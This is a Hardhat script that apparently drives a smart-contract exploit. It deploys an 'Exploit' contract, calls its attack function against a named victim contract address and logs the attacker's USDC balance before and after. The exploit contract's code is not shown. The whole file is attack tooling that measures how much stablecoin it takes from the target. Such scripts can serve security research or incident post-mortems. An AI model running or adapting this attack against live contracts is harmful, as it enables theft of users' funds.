import hre from "hardhat"
import {Exploit__factory, IERC20__factory} from "../typechain";

async function main() {
  const [signer] = await hre.ethers.getSigners();
  const exploit = await new Exploit__factory(signer).deploy();
  const usdc = IERC20__factory.connect("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",signer);
  const victim = "0xCB32033c498b54818e58270F341e5f6a3bce993B";

  console.log("USDC balance of attacker:",hre.ethers.utils.formatUnits(await usdc.balanceOf(signer.address),await usdc.decimals()))
  console.log("Exploiting...")
  await exploit.attack(victim,{"value":1});
  console.log("Exploit complete.")
  console.log("USDC balance of attacker:",hre.ethers.utils.formatUnits(await usdc.balanceOf(signer.address),await usdc.decimals()))
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
